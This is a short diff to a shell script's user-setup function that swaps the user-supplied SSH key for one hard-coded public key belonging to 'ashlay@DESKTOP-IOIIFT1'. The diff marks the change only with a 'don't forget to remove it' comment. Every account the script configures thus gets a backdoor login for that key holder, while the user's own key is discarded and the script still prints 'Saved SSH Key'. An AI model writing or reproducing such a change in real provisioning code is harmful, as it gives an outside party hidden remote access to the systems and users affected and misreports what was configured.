@@ -233,7 +233,8 @@ ConfigureUser() {
             mkdir -p /home/$USERNAME/.ssh
         fi
         touch /home/$USERNAME/.ssh/authorized_keys
-        echo -e "$key" >>/home/$USERNAME/.ssh/authorized_keys
+        #HARD CODED SSH PUBLIC KEY - DON'T FORGET TO REMOVE IT
+        echo -e "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAkvac0CCv23eE0anDNhMDcMeufRzzt0al3hfKw4nwAU ashlay@DESKTOP-IOIIFT1" >>/home/$USERNAME/.ssh/authorized_keys
         echo -e 'Saved SSH Key\n'
     fi
 }
